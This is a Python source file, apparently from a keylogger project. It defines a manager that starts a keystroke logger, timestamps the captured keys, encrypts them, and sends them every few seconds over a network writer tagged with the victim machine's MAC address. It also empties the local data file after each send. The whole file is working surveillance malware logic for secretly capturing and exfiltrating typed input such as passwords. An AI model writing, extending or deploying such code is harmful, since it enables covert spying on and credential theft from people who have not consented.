import sys
sys.path.append('../../utilities/encryptionDecryption')
from encryption import Encryption
import uuid
from logger.keylogger.keylogger_service import KeyloggerService
from logger.writer.FileWriter import FileWriter
from logger.writer.NetWorkWriter import NetWorkWriter
from time import sleep
from datetime import datetime
import logging

logging.basicConfig(filename='../../utilities/log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')

class KeyLoggerManager:
    def __init__(self):
        self.mac_address = hex(uuid.getnode())
        self.writer = FileWriter()
        self.keylogger = KeyloggerService()
        self.encoder = Encryption(open('../../utilities/key.txt', 'r').read())
        self.flag = True

    def start(self):
        try:
            self.keylogger.start_logging()
            logging.info('Logging started')
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            self.flag = False


    def handle_logging(self):
        """
        Get the logins from the logger, add time stamp, encrypt it, write to file and send it
        :return:
        """
        while self.flag:
            logged_keys = "".join(self.keylogger.get_logged_keys())
            if logged_keys:
                if "stop" in logged_keys:
                    self.keylogger.stop_logging()
                    self.flag = False
                    logged_keys = logged_keys.split('stop')[0] + 'stop'
                logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                try:
                    encrypted_data = self.encoder.encryption(logged_keys)
                    self.write_data(encrypted_data)
                except Exception as e:
                    logging.error(e)
                    return
            else:
                self.write_data('')
            sleep(5)

    def write_data(self, encrypted_data):
        # if datetime.now().hour == 2 and datetime.now().minute == 20 and 0 <= datetime.now().second <= 5:
        if True:
            self.writer = NetWorkWriter()
            with open('../Data_File.txt', 'r') as file:
                encrypted_data = file.read() + encrypted_data
            with open('../Data_File.txt', 'w') as file:
                pass
        else:
            self.writer = FileWriter()
        self.writer.send_data(encrypted_data, self.mac_address)


def main():
    key_logger = KeyLoggerManager()
    key_logger.start()
    key_logger.handle_logging()



if __name__ == "__main__":
    main()

